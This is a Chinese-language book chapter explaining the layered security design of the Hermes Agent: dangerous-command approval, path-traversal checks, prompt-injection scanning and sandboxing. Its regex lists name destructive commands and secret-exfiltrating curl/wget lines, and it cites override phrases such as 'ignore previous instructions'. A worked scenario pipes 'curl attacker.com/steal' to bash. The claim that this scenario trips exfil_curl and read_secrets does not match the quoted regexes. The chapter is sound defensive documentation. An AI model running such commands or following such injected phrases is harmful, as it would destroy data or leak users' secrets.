
# 第 26 章：安全纵深

> **核心问题**：命令审批、路径安全、注入防御的多层安全纵深如何设计？

---

## 26.1 安全模型概览

Hermes Agent 是一个拥有终端访问权、文件系统读写权、浏览器控制权和网络请求能力的自主系统。这意味着一个 prompt injection 攻击或一个失控的 Agent 行为可能造成真实的系统损害——删除文件、泄露密钥、篡改 git 历史。Hermes 的安全模型因此采用了**纵深防御**（defense-in-depth）的经典架构：四层独立的安全屏障，每一层假设上一层可能已经被突破。

```
┌─────────────────────────────────────────────────┐
│  Layer 1: 危险命令审批 (tools/approval.py)       │
│  30+ regex 模式匹配 + Smart Approval LLM 判断    │
├─────────────────────────────────────────────────┤
│  Layer 2: 路径安全 (tools/path_security.py)      │
│  resolve() + relative_to() 遏制路径遍历          │
├─────────────────────────────────────────────────┤
│  Layer 3: 注入检测 (prompt_builder + memory_tool)│
│  上下文文件扫描 + 记忆内容扫描                     │
├─────────────────────────────────────────────────┤
│  Layer 4: 沙箱执行 (code_execution_tool)         │
│  PTC 沙箱 + 容器后端 (Docker/Singularity/Modal)  │
└─────────────────────────────────────────────────┘
```

这个模型的一个关键设计原则是**渐进式信任**。在本地终端环境中（`env_type="local"`），所有四层都激活。在容器化环境中（Docker、Singularity、Modal、Daytona），第一层审批被跳过——因为容器本身提供了隔离。在 `--yolo` 模式下，用户显式放弃了第一层保护。但第二、三、四层始终激活，即使在最宽松的模式下。

---

## 26.2 危险命令审批

`tools/approval.py` 是第一层防御的完整实现——检测危险命令、管理审批状态、与用户交互获取授权。它是一个 924 行的自包含模块，定义了从模式匹配到配置持久化的全部逻辑。

### 模式检测

危险命令检测基于一个精心维护的正则表达式列表：

```python
# tools/approval.py:75-133 (sampled)
DANGEROUS_PATTERNS = [
    (r'\brm\s+(-[^\s]*\s+)*/', "delete in root path"),
    (r'\brm\s+-[^\s]*r', "recursive delete"),
    (r'\bchmod\s+(-[^\s]*\s+)*(777|666|o\+[rwx]*w)', "world/other-writable permissions"),
    (r'\bmkfs\b', "format filesystem"),
    (r'\bdd\s+.*if=', "disk copy"),
    (r'\bDROP\s+(TABLE|DATABASE)\b', "SQL DROP"),
    (r'\bDELETE\s+FROM\b(?!.*\bWHERE\b)', "SQL DELETE without WHERE"),
    (r'\b(curl|wget)\b.*\|\s*(ba)?sh\b', "pipe remote content to shell"),
    (r'\b(python[23]?|perl|ruby|node)\s+-[ec]\s+', "script execution via -c/-e"),
    (r'\bgit\s+reset\s+--hard\b', "git reset --hard (destroys uncommitted changes)"),
    (r'\bgit\s+push\b.*--force\b', "git force push (rewrites remote history)"),
    (r'\bchmod\s+\+x\b.*[;&|]+\s*\./', "chmod +x followed by immediate execution"),
    (r'\bkill\b.*\$\(\s*pgrep\b', "kill process via pgrep expansion"),
    # ... 30+ patterns total
]
```

每个模式是一个 `(regex, description)` 二元组。description 不仅是人类可读的标签，也是审批系统的 pattern key——替代了早期版本使用正则表达式本身作为 key 的设计。为了向后兼容，`_PATTERN_KEY_ALIASES` 映射了新旧 key 之间的双向关系，确保旧版 config.yaml 中的 `command_allowlist` 条目仍然有效。

模式列表覆盖了几个大的威胁类别：文件系统破坏（rm -rf、mkfs、dd）、权限提升（chmod 777、chown root）、数据库破坏（DROP TABLE、DELETE 无 WHERE、TRUNCATE）、远程代码执行（curl|sh、python -c）、git 历史破坏（push --force、reset --hard、clean -f）、自我终止（pkill hermes、kill $(pgrep hermes)）。

检测前的命令预处理是安全关键的：

```python
# tools/approval.py:163-178
def _normalize_command_for_detection(command: str) -> str:
    from tools.ansi_strip import strip_ansi
    command = strip_ansi(command)       # 剥离 ANSI 转义序列
    command = command.replace('\x00', '') # 剥离 null 字节
    command = unicodedata.normalize('NFKC', command)  # 规范化 Unicode
    return command
```

这三步规范化防止了三类绕过技术：(1) 在命令中嵌入 ANSI 转义码来"隐藏"关键字（终端显示 `ls` 但实际执行 `rm -rf /`）；(2) 用 null 字节分割关键字（`r\x00m`）；(3) 用 Unicode 全角字符替代 ASCII（`ｒｍ` → `rm`）。

### 审批状态管理

审批状态是 per-session 的，使用线程安全的全局字典：

```python
# tools/approval.py:199-203
_lock = threading.Lock()
_pending: dict[str, dict] = {}           # 等待审批的请求
_session_approved: dict[str, set] = {}   # 每个 session 已批准的模式
_session_yolo: set[str] = set()          # YOLO 模式的 session
_permanent_approved: set = set()          # 永久批准（跨 session）
```

session key 的解析使用 `contextvars` 而不是 `os.environ`，这是因为 Gateway 在 executor 线程中并发运行多个 Agent——一个全局环境变量在多线程下是 racy 的：

```python
# tools/approval.py:26-29
_approval_session_key: contextvars.ContextVar[str] = contextvars.ContextVar(
    "approval_session_key",
    default="",
)
```

### 审批流程

`check_all_command_guards()` 是主入口，编排了完整的审批决策流程：

1. **容器豁免**——Docker、Singularity、Modal、Daytona 后端直接通过
2. **YOLO 豁免**——环境变量或 per-session YOLO 模式直接通过
3. **Tirith 安全扫描**——可选的静态分析引擎，检查命令的语义安全性
4. **DANGEROUS_PATTERNS 匹配**——正则表达式模式检测
5. **已批准检查**——检查 session 或永久批准列表
6. **Smart Approval**（当 `approvals.mode=smart`）——使用 auxiliary LLM 判断风险
7. **用户交互**——CLI 模式弹出 `[o]nce | [s]ession | [a]lways | [d]eny` 提示

**Smart Approval** 是一个受 OpenAI Codex 启发的功能。它使用辅助 LLM 分析被标记的命令是否真正危险：

```python
# tools/approval.py:531-580
def _smart_approve(command: str, description: str) -> str:
    client, model = get_text_auxiliary_client(task="approval")
    prompt = f"""You are a security reviewer for an AI coding agent.
Command: {command}
Flagged reason: {description}

Rules:
- APPROVE if the command is clearly safe
- DENY if it could genuinely damage the system
- ESCALATE if you're uncertain

Respond with exactly one word: APPROVE, DENY, or ESCALATE"""

    response = client.chat.completions.create(
        model=model, messages=[{"role": "user", "content": prompt}],
        temperature=0,
    )
    answer = response.choices[0].message.content.strip().upper()
    if "APPROVE" in answer: return "approve"
    elif "DENY" in answer: return "deny"
    else: return "escalate"
```

这解决了一个实际痛点——`python -c "print('hello')"` 被标记为"script execution via -c flag"，但它完全无害。Smart Approval 让 LLM 判断这是误报，自动放行，减少用户的审批疲劳。如果 LLM 判断"genuinely dangerous"则直接拒绝，不确定时回退到人工审批。

### Gateway 阻塞审批

Gateway 场景（Telegram、Discord 等消息平台）不能使用终端 `input()` 获取用户输入。解决方案是一个基于 `threading.Event` 的阻塞队列：

```python
# tools/approval.py:214-223
class _ApprovalEntry:
    __slots__ = ("event", "data", "result")
    def __init__(self, data: dict):
        self.event = threading.Event()
        self.data = data
        self.result: Optional[str] = None

_gateway_queues: dict[str, list] = {}
```

当 Agent 线程遇到危险命令，它创建一个 `_ApprovalEntry` 并 `event.wait(timeout=300)`，同时通过 `notify_cb` 向用户发送审批请求消息。用户在消息平台上回复 `/approve` 或 `/deny`，Gateway 调用 `resolve_gateway_approval()` 设置 `entry.result` 并唤醒 `event`。Agent 线程解除阻塞，继续或中止命令执行。

多个线程可以同时阻塞——每个线程有自己的 `_ApprovalEntry`。`/approve` 解决最老的一个（FIFO），`/approve all` 解决所有等待中的审批。

---

## 26.3 路径安全

`tools/path_security.py` 是一个小巧但关键的模块——它提供路径遍历防护，防止 Agent 通过 `../../../etc/passwd` 这样的路径访问允许目录之外的文件。

```python
# tools/path_security.py:15-44
def validate_within_dir(path: Path, root: Path) -> Optional[str]:
    """Ensure *path* resolves to a location within *root*."""
    try:
        resolved = path.resolve()
        root_resolved = root.resolve()
        resolved.relative_to(root_resolved)
    except (ValueError, OSError) as exc:
        return f"Path escapes allowed directory: {exc}"
    return None

def has_traversal_component(path_str: str) -> bool:
    """Return True if *path_str* contains ``..`` traversal components."""
    parts = Path(path_str).parts
    return ".." in parts
```

`validate_within_dir()` 使用了 Python pathlib 的一个安全模式——`Path.resolve()` 解析所有符号链接和 `..` 组件得到绝对路径，然后 `relative_to()` 验证它是否是 root 的子路径。如果一个路径通过符号链接逃逸了 root 目录，`resolve()` 会跟随链接到真实位置，`relative_to()` 就会抛出 `ValueError`。

这个函数被多个工具模块共享：`skill_manager_tool` 确保 Skill 文件操作不逃逸 skills 目录；`cronjob_tools` 确保 cron 作业文件不逃逸 cron 目录；凭据文件处理确保不访问 `~/.hermes` 之外的敏感文件。`has_traversal_component()` 作为快速预检——它不做完整的路径解析，只检查路径组件中是否包含 `..`，在完整验证之前快速拒绝明显的遍历尝试。

在第 25 章的配置讨论中，我们看到 `_secure_dir()` 和 `_secure_file()` 设置了 Unix 文件权限。这与路径安全形成了双重保护——即使路径遍历检查被绕过（比如通过一个不使用 `validate_within_dir` 的新工具），Unix 权限仍然限制了文件的可读性。

---

## 26.4 Prompt 注入防御

Hermes Agent 的系统提示由多个来源组装——身份描述、SOUL.md、.hermes.md 项目配置、MEMORY.md 记忆内容、Skill 索引。每个来源都是一个潜在的注入面——一个恶意的 `.hermes.md` 或被投毒的 MEMORY.md 可能包含"ignore all previous instructions"这样的 prompt injection 载荷。

`agent/prompt_builder.py` 为上下文文件提供第一道扫描：

```python
# agent/prompt_builder.py:36-52
_CONTEXT_THREAT_PATTERNS = [
    (r'ignore\s+(previous|all|above|prior)\s+instructions', "prompt_injection"),
    (r'do\s+not\s+tell\s+the\s+user', "deception_hide"),
    (r'system\s+prompt\s+override', "sys_prompt_override"),
    (r'disregard\s+(your|all|any)\s+(instructions|rules|guidelines)', "disregard_rules"),
    (r'act\s+as\s+(if|though)\s+you\s+(have\s+no|don\'t\s+have)\s+(restrictions|limits|rules)',
     "bypass_restrictions"),
    (r'<!--[^>]*(?:ignore|override|system|secret|hidden)[^>]*-->', "html_comment_injection"),
    (r'<\s*div\s+style\s*=\s*["\'][\s\S]*?display\s*:\s*none', "hidden_div"),
    (r'translate\s+.*\s+into\s+.*\s+and\s+(execute|run|eval)', "translate_execute"),
    (r'curl\s+[^\n]*\$\{?\w*(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API)', "exfil_curl"),
    (r'cat\s+[^\n]*(\.env|credentials|\.netrc|\.pgpass)', "read_secrets"),
]
```

这些模式分为三个类别：**指令劫持**（ignore instructions, disregard rules, system prompt override）、**隐蔽载荷**（HTML 注释注入、display:none div——在网页提取的内容中可能存在）、**数据外泄**（curl 带密钥变量、cat 敏感文件）。

除了正则模式，还检测**不可见 Unicode 字符**：

```python
# agent/prompt_builder.py:49-52
_CONTEXT_INVISIBLE_CHARS = {
    '\u200b', '\u200c', '\u200d', '\u2060', '\ufeff',  # 零宽字符
    '\u202a', '\u202b', '\u202c', '\u202d', '\u202e',  # 双向控制字符
}
```

零宽字符可以用来在看似正常的文本中隐藏指令——肉眼看不到，但 LLM 可能会处理。双向覆盖字符（U+202E）可以让文本在视觉上显示为一个方向，但实际内容是另一个方向（bidi attack）。

扫描函数 `_scan_context_content()` 在检测到威胁时不是抛出异常，而是**替换内容**：

```python
# agent/prompt_builder.py:55-72
def _scan_context_content(content: str, filename: str) -> str:
    findings = []
    for char in _CONTEXT_INVISIBLE_CHARS:
        if char in content:
            findings.append(f"invisible unicode U+{ord(char):04X}")
    for pattern, pid in _CONTEXT_THREAT_PATTERNS:
        if re.search(pattern, content, re.IGNORECASE):
            findings.append(pid)
    if findings:
        logger.warning("Context file %s blocked: %s", filename, ", ".join(findings))
        return f"[BLOCKED: {filename} contained potential prompt injection ({', '.join(findings)})]"
    return content
```

被阻止的文件内容被替换为一个明确的 `[BLOCKED: ...]` 标记。这比静默丢弃更好——Agent 知道文件被阻止了，可以告知用户，而不是假装文件不存在。

`tools/memory_tool.py` 对记忆内容执行类似但更严格的扫描：

```python
# tools/memory_tool.py:60-81 (sampled)
_MEMORY_THREAT_PATTERNS = [
    (r'ignore\s+(previous|all|above|prior)\s+instructions', "prompt_injection"),
    (r'you\s+are\s+now\s+', "role_hijack"),
    (r'do\s+not\s+tell\s+the\s+user', "deception_hide"),
    (r'system\s+prompt\s+override', "sys_prompt_override"),
    (r'disregard\s+(your|all|any)\s+(instructions|rules|guidelines)', "disregard_rules"),
    (r'curl\s+[^\n]*\$\{?\w*(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API)', "exfil_curl"),
    (r'wget\s+[^\n]*\$\{?\w*(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API)', "exfil_wget"),
]
```

记忆扫描增加了 `role_hijack` 模式（`"you are now ..."`），因为记忆内容直接注入系统提示，角色劫持攻击在这里更有效。扫描失败时，memory tool 直接拒绝写入并返回错误信息，解释为什么内容被阻止。

这两层注入防御的设计理念是**宁可误报也不漏报**。正则表达式匹配必然会有 false positive——比如一个讨论 prompt injection 防御的技术文档可能触发"ignore previous instructions"模式。但考虑到这些内容直接进入系统提示，误报的代价（用户需要修改措辞）远小于漏报的代价（Agent 被劫持）。

---

## 26.5 沙箱执行

第四层防御是执行隔离——即使命令通过了审批、路径检查和注入扫描，它的执行环境仍然可以被限制在一个沙箱内。

Hermes 有两种沙箱机制：**容器后端**和 **PTC（Programmatic Tool Calling）沙箱**。

### 容器后端

当 `terminal.backend` 设为 `"docker"`、`"singularity"`、`"modal"` 或 `"daytona"` 时，所有终端命令都在容器内执行。容器提供了进程、文件系统和网络的隔离——Agent 无法访问宿主机的文件系统（除非显式挂载），无法读取宿主机的环境变量（除非通过 `docker_forward_env` 传递），无法与宿主机的其他进程交互。

这就是为什么 `check_all_command_guards()` 对容器后端跳过审批：

```python
# tools/approval.py:598-599
if env_type in ("docker", "singularity", "modal", "daytona"):
    return {"approved": True, "message": None}
```

容器本身就是审批的替代品——它限制了命令的影响范围。在第 25 章的配置讨论中，我们看到了资源限制（CPU、内存、磁盘）和挂载控制（`docker_volumes`、`docker_mount_cwd_to_workspace`）如何细化这个隔离。

### PTC 沙箱

`tools/code_execution_tool.py` 实现了一个更精细的沙箱——Programmatic Tool Calling（PTC）。它让 LLM 编写 Python 脚本，脚本通过 RPC 回调 Hermes 的工具，但只能访问一个严格限制的工具子集：

```python
# tools/code_execution_tool.py:56-64
SANDBOX_ALLOWED_TOOLS = frozenset([
    "web_search",
    "web_extract",
    "read_file",
    "write_file",
    "search_files",
    "patch",
    "terminal",
])
```

只有 7 个工具被允许——没有 `memory`（防止记忆投毒）、没有 `delegate_task`（防止递归升级）、没有 `browser_*`（防止未授权的网络访问）、没有 `skill_manage`（防止 Skill 篡改）。`model_tools.py` 在构建工具定义时，动态计算 `SANDBOX_ALLOWED_TOOLS` 与当前 session 实际可用工具的交集，确保 execute_code 的 schema 只列出真正可调用的工具。

PTC 沙箱的通信架构分为两种传输方式：

**本地 UDS**（Unix Domain Socket）——父进程生成 `hermes_tools.py` stub 模块，打开 UDS 并启动 RPC listener 线程，然后 spawn 子进程执行 LLM 的脚本。工具调用通过 UDS 回传到父进程 dispatch。

**远程文件 RPC**——对于 Docker/SSH/Modal 等远程后端，使用基于文件的 RPC：脚本将工具调用写为 request 文件，父进程的轮询线程通过 `env.execute()` 读取请求并 dispatch，将响应写为 response 文件。

两种方式都有资源限制：

```python
# tools/code_execution_tool.py:66-69
DEFAULT_TIMEOUT = 300        # 5 minutes max execution time
DEFAULT_MAX_TOOL_CALLS = 50  # Max RPC calls per script
MAX_STDOUT_BYTES = 50_000    # 50 KB stdout capture
MAX_STDERR_BYTES = 10_000    # 10 KB stderr capture
```

这些限制防止了失控的脚本无限循环或产生巨量输出。timeout 和 max_tool_calls 可以通过 `config.yaml` 的 `code_execution` 段覆盖。

### 安全层的协同

四层防御不是独立工作的——它们形成了协同的纵深。考虑一个攻击场景：恶意的 `.hermes.md` 文件试图让 Agent 执行 `curl attacker.com/steal | bash`。

1. **Layer 3（注入检测）**在 `_scan_context_content()` 中阻止 `.hermes.md` 的加载（匹配 `curl ... | sh` 模式中的 `exfil_curl` 和 `read_secrets`），Agent 看到 `[BLOCKED]` 标记而不是恶意指令。

2. 即使 Layer 3 被绕过（比如使用了更巧妙的编码），**Layer 1（命令审批）**的 `"pipe remote content to shell"` 模式会在 `terminal_tool` 执行前拦截命令。

3. 即使 Layer 1 也被绕过（比如用户粗心地 approve 了），**Layer 4（沙箱执行）**如果启用，会限制命令在容器内执行，泄露的只是容器内的数据而非宿主机密钥。

4. **Layer 2（路径安全）**确保即使在容器内，Agent 也不能通过路径遍历访问挂载点之外的宿主文件系统。

这种纵深设计意味着攻击者需要同时绕过所有四层才能造成实际损害。每一层的检测粒度和防御机制都不同——正则模式匹配、路径数学验证、NLP 模式扫描、操作系统级隔离——这使得单一的绕过技术难以突破整个防线。

---

## 速查表

| 文件 | 角色 | 关键机制 |
|------|------|----------|
| `tools/approval.py` | 危险命令审批 | 30+ DANGEROUS_PATTERNS, ANSI/NFKC 规范化, per-session state (contextvars), Smart Approval LLM, Gateway 阻塞队列 |
| `tools/path_security.py` | 路径遍历防护 | validate_within_dir (resolve+relative_to), has_traversal_component 预检 |
| `agent/prompt_builder.py` | 上下文注入检测 | 10 个 _CONTEXT_THREAT_PATTERNS, 不可见 Unicode 检测, 内容替换为 [BLOCKED] |
| `tools/memory_tool.py` | 记忆注入检测 | _MEMORY_THREAT_PATTERNS (含 role_hijack), 不可见 Unicode, 拒绝写入 |
| `tools/code_execution_tool.py` | PTC 沙箱 | SANDBOX_ALLOWED_TOOLS (7 工具), UDS/文件 RPC, 资源限制 (timeout/max_calls/stdout) |
| `tools/tirith_security.py` | 静态安全扫描 | 可选的 tirith 规则引擎, 与 approval 集成 |
